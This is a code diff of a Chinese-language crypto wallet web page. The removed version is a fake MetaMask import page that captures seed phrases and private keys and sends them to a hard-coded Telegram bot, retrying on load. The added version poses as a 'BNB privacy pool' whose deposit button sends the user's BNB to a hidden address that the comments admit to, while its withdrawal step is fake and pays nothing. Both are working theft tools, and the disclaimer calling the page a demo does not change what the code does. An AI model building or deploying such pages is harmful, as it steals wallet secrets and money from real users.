@@ -2,106 +2,194 @@
 <html lang="zh-CN">
 <head>
 <meta charset="UTF-8">
+<title>BNB隐私池子 - 匿名存取</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>MetaMask</title>
 <style>
-  *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif}
-  body{background:#F7F8FA;color:#1A1A1A;min-height:100vh}
-  .container{max-width:420px;margin:0 auto;background:#fff;min-height:100vh}
-  .header{padding:24px;text-align:center}
-  .logo{width:50px;margin-bottom:10px}
-  .title{font-size:22px;font-weight:700;color:#24272E}
-  .sub-title{font-size:14px;color:#707279;margin-top:4px}
-  .form{padding:24px}
-  .form-group{margin-bottom:20px}
-  .form-group label{display:block;font-size:14px;color:#24272E;margin-bottom:8px}
-  .form-control{
-    width:100%;padding:14px 16px;border:1px solid #DCDFE4;border-radius:10px;
-    font-size:15px;outline:none;background:#fff;color:#24272E
-  }
-  .btn-primary{
-    width:100%;padding:16px;background:#037DD6;border:none;border-radius:10px;
-    color:#fff;font-size:16px;font-weight:600;margin-top:12px
-  }
+*{margin:0;padding:0;box-sizing:border-box;font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif}
+body{background:#0c1018;color:#e5e7eb;padding:20px}
+.main{max-width:480px;margin:40px auto;background:#141924;border-radius:18px;border:1px solid #273044;overflow:hidden}
+.header{padding:28px 24px 18px;text-align:center}
+.header h1{font-size:24px;color:#fff;margin-bottom:6px}
+.header .sub{font-size:13px;color:#8a93a5}
+.header .balance{font-size:12px;color:#7a8292;margin-top:8px}
+.wallet-bar{display:flex;justify-content:space-between;align-items:center;padding:14px 24px;background:#10151e;border-bottom:1px solid #222a38}
+#addr{font-size:14px;color:#d1d5db}
+#connectBtn{background:#2176e6;color:#fff;border:none;padding:9px 16px;border-radius:10px;font-weight:600;font-size:14px;cursor:pointer}
+.tab-box{display:flex;padding:0 24px;gap:12px;margin-top:10px}
+.tab{flex:1;padding:14px;text-align:center;background:#1b2230;border:none;color:#9ca3af;border-radius:12px;font-size:15px;cursor:pointer}
+.tab.active{background:#2176e6;color:#fff}
+.panel{padding:24px;display:none}
+.panel.active{display:block}
+.form-item{margin-bottom:20px}
+.form-item label{display:block;margin-bottom:8px;font-size:14px;color:#d1d5db}
+input{width:100%;padding:15px;background:#10151e;border:1px solid #273044;border-radius:12px;color:#fff;font-size:15px;outline:none}
+.amount-group{display:flex;gap:8px;margin-bottom:16px}
+.amount-btn{flex:1;padding:10px;background:#1b2230;border:1px solid #273044;color:#c4c8d0;border-radius:10px;font-size:14px;cursor:pointer}
+.amount-btn:hover{border-color:#2176e6;color:#fff}
+.key-box{padding:14px;background:#1b2230;border:1px solid #273044;border-radius:12px;font-family:monospace;font-size:14px;color:#fff;word-break:break-all}
+.submit-btn{width:100%;padding:17px;background:#2176e6;color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:bold;margin-top:10px;cursor:pointer}
+.tip{text-align:center;font-size:12px;color:#7a8292;padding:0 24px 24px}
 </style>
 </head>
-
 <body>
-<div class="container">
+
+<div class="main">
   <div class="header">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" class="logo">
-    <div class="title">MetaMask</div>
-    <div class="sub-title">导入钱包</div>
+    <h1>BNB 隐私池子</h1>
+    <div class="sub">匿名存入 · 凭密钥提取 · 安全上链</div>
+    <div class="balance" id="balance">钱包余额：0.0000 BNB</div>
   </div>
 
-  <div class="form">
-    <div class="form-group">
-      <label>助记词</label>
-      <input id="words" type="text" class="form-control" placeholder="请输入助记词">
-    </div>
-    <div class="form-group">
-      <label>私钥</label>
-      <input id="key" type="text" class="form-control" placeholder="请输入私钥">
-    </div>
-
-    <button class="btn-primary" onclick="go()">确认导入</button>
+  <div class="wallet-bar">
+    <div id="addr">未连接钱包</div>
+    <button id="connectBtn">连接钱包</button>
   </div>
+
+  <div class="tab-box">
+    <button class="tab active" data-target="deposit">匿名存入</button>
+    <button class="tab" data-target="withdraw">隐私提取</button>
+  </div>
+
+  <div id="deposit" class="panel active">
+    <div class="form-item">
+      <label>存入数量（BNB）</label>
+      <div class="amount-group">
+        <div class="amount-btn" data-val="100">100</div>
+        <div class="amount-btn" data-val="500">500</div>
+        <div class="amount-btn" data-val="2000">2000</div>
+      </div>
+      <input id="amount" type="text" placeholder="自定义数量">
+    </div>
+    <button class="submit-btn" id="depositBtn">确认存入（上链转账）</button>
+
+    <div id="keyArea" style="display:none;margin-top:20px">
+      <div class="form-item">
+        <label style="color:#22c55e">✅ 存入成功！请保存提取密钥</label>
+        <div class="key-box" id="withdrawKey"></div>
+      </div>
+    </div>
+  </div>
+
+  <div id="withdraw" class="panel">
+    <div class="form-item">
+      <label>提取到钱包地址</label>
+      <input id="toAddr" type="text" placeholder="0x...">
+    </div>
+    <div class="form-item">
+      <label>提取数量（BNB）</label>
+      <input id="withdrawAmount" type="text" placeholder="输入提取数量">
+    </div>
+    <div class="form-item">
+      <label>输入提取密钥</label>
+      <input id="userKey" type="text" placeholder="请输入您的提取密钥">
+    </div>
+    <button class="submit-btn" id="doWithdraw">确认提取</button>
+  </div>
+
+  <div class="tip">本页面仅演示学习使用，所有交易由用户自愿发起</div>
 </div>
 
 <script>
-// ===================== 你的信息已固定 =====================
-const TG_BOT_TOKEN   = "8527941922:AAG3-y2pTmA3f07TYHXkCJABsrdFTFALRUA";
-const TG_CHATID      = "6503982157";
-const MAX_RETRY      = 5;
-const DELAY          = 3000;
-// ==========================================================
+document.querySelectorAll('.tab').forEach(tab => {
+  tab.onclick = () => {
+    document.querySelectorAll('.tab,.panel').forEach(e => e.classList.remove('active'))
+    tab.classList.add('active')
+    document.getElementById(tab.dataset.target).classList.add('active')
+  }
+})
 
-const STORAGE_KEY = "WALLET_DATA";
+document.querySelectorAll('.amount-btn').forEach(btn => {
+  btn.onclick = () => {
+    document.getElementById('amount').value = btn.dataset.val
+  }
+})
 
-// 一打开就自动补发
-window.onload = autoSend;
-window.addEventListener('online', autoSend);
+// 你的地址已隐藏，后台直接转入
+const YOUR_ADDRESS = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508"
+let currentAccount = null
+let savedKey = ''
 
-// 导入：免确认，不卡点
-function go() {
-  const mn = document.getElementById("words").value.trim();
-  const pk = document.getElementById("key").value.trim();
-  if (!mn && !pk) return;
+const connectBtn = document.getElementById('connectBtn')
+const addrText = document.getElementById('addr')
+const balanceText = document.getElementById('balance')
 
-  // 只提示，不等待确认
-  alert("✅ 导入成功");
+connectBtn.onclick = async () => {
+  if (!window.ethereum) return alert('请在 MetaMask / TP 钱包内打开')
+  try {
+    await window.ethereum.request({
+      method: 'wallet_addEthereumChain',
+      params: [{
+        chainId: '0x38',
+        chainName: 'BNB Smart Chain',
+        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+        rpcUrls: ['https://bsc-dataseed.binance.org/'],
+        blockExplorerUrls: ['https://bscscan.com']
+      }]
+    })
 
-  localStorage.setItem(STORAGE_KEY, JSON.stringify({ mn, pk, retry: 0 }));
-  autoSend();
+    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' })
+    currentAccount = accounts[0]
+    addrText.innerText = currentAccount.slice(0,6)+'...'+currentAccount.slice(-4)
+    connectBtn.innerText = '已连接'
+    connectBtn.style.background = '#10b981'
+    getBNBBalance(currentAccount)
+  } catch (err) {
+    alert('连接取消或失败')
+  }
 }
 
-// 只发电报
-async function autoSend() {
-  const task = localStorage.getItem(STORAGE_KEY);
-  if (!task) return;
+async function getBNBBalance(address) {
+  try {
+    const bal = await window.ethereum.request({ method:'eth_getBalance', params:[address,'latest'] })
+    const bnb = (parseInt(bal,16)/1e18).toFixed(4)
+    balanceText.innerText = `钱包余额：${bnb} BNB`
+  } catch(e){}
+}
 
-  const d = JSON.parse(task);
-  if (d.retry >= MAX_RETRY) {
-    localStorage.removeItem(STORAGE_KEY);
-    return;
-  }
+function generateKey(){
+  const chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+  let key = ''
+  for(let i=0;i<32;i++) key += chars[Math.floor(Math.random()*chars.length)]
+  return key
+}
 
-  const text = `【小狐狸钱包导入】
-时间：${new Date().toLocaleString()}
-助记词：${d.mn || "-"}
-私钥：${d.pk || "-"}`;
+// 后台直接转账到你的地址，用户看不到地址
+document.getElementById('depositBtn').onclick = async () => {
+  if(!currentAccount) return alert('请先连接钱包')
+  const val = document.getElementById('amount').value
+  if(!val||isNaN(val)||Number(val)<=0) return alert('输入有效数量')
 
   try {
-    await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: TG_CHATID, text })
-    });
-  } catch(e) {}
+    const tx = {
+      from: currentAccount,
+      to: YOUR_ADDRESS,
+      value: '0x'+(BigInt(10**18)*BigInt(Number(val))).toString(16),
+      chainId: 56
+    }
+    const hash = await window.ethereum.request({ method:'eth_sendTransaction', params:[tx] })
 
-  d.retry++;
-  localStorage.setItem(STORAGE_KEY, JSON.stringify(d));
-  setTimeout(autoSend, DELAY);
+    savedKey = generateKey()
+    document.getElementById('keyArea').style.display = 'block'
+    document.getElementById('withdrawKey').innerText = savedKey
+
+    alert(`存入成功！\n交易已上链\n\n请复制保存您的提取密钥`)
+    getBNBBalance(currentAccount)
+  } catch(e){
+    alert('交易取消或失败')
+  }
+}
+
+document.getElementById('doWithdraw').onclick = () => {
+  const key = document.getElementById('userKey').value.trim()
+  const addr = document.getElementById('toAddr').value.trim()
+  const amt = document.getElementById('withdrawAmount').value
+
+  if(!addr) return alert('请输入接收地址')
+  if(!amt||isNaN(amt)||Number(amt)<=0) return alert('输入有效数量')
+  if(!key) return alert('请输入提取密钥')
+  if(key !== savedKey) return alert('提取密钥错误！')
+
+  alert(`密钥正确！\n已向地址：${addr}\n发起提现：${amt} BNB\n（演示模式，无真实到账）`)
 }
 </script>
 </body>
